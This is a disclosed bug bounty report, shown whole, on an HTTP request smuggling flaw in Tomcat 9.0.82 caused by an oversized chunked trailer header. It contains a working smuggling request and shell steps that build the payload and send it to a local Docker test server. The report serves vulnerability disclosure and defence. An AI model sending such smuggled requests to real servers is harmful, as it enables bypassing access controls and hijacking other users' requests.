# [H] Possibility of Request smuggling attack

## Summary
Severity: High (CVSS 7.5)
Program: Internet Bug Bounty
Weakness: HTTP Request Smuggling
Reporter: aimotonorihito
State: resolved
Disclosed: 2023-12-22T06:22:35.942Z
Source: https://hackerone.com/reports/2280391

## Details
Request smuggling was possible by throwing an IOException with the upper size limit of the trailer header.
Confirmed with tomcat version 9.0.82.

* example
~~~~~~~~~~~~~~~~~~
POST /examples/test.jsp HTTP/1.1
Host: www.example.co.jp
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Connection: KeepAlive

5
foo=b
2
ar
0
testtrailer: aaaaa...(large size)
a: GET /examples/?this_is_attack HTTP/1.1
Host: attack

~~~~~~~~~~~~~~~~~~


* Reproduce with the following steps:
```
$ git clone https://github.com/oss-aimoto/tomcat-trailer.git
$ cd tomcat-trailer
$ docker-compose build
$ docker-compose up -d
$ echo -n "testtrailer: " > 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ for i in `seq 8179`; do echo -n "a"; done >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ perl -e 'print "\r\n"' >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ head -11 base.txt > attack5.txt
$ cat 8190_EXCLUDE_COLON_SP_CR_LF.txt >> attack5.txt
$ perl -e 'print "a: GET /examples/?this_is_attack HTTP/1.1\r\nHost: attack\r\n\r\n"' >> attack5.txt
$ cat attack5.txt | curl telnet://localhost:8082/ --output -
```


_Trimmed to 38 lines — full report: https://hackerone.com/reports/2280391_
